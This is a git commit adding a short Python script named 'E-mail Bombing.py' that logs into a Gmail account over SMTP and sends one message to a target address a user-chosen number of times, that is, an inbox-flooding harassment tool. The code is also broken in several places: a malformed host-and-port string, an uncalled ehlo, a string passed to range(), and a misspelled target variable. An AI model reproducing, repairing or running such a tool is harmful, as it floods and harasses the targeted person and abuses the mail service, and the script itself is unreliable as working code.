db3526ec7225ca9d2c10e3dc816a7b17ac4aa5aa
IMTIAZ <126008482+IMTIAZ-X@users.noreply.github.com>
2023-02-23 09:13:16 +0600

    Create E-mail Bombing.py

---
+++ E-mail Bombing.py
@@ -0,0 +1,18 @@
+ import smtplib
+
+IMTIAZ=smtplib.SMTP("smtp.gmail.com','578")
+
+IMTIAZ.ehlo
+IMTIAZ.starttls()
+
+email=str(input("Enter Your Gmail : "))
+pwd=str(input(" Enter Your Password : "))
+tamil=str(input(" Enter Your Target E-Mail : "))
+msg=str(input(" Enter Your Massage : "))
+amount=str(input(" Enter Your Amount"))
+
+IMTIAZ.login(email,pwd)
+
+for i in range(amount):
+    IMTIAZ.sendmail(email,tmail,msg)
+    
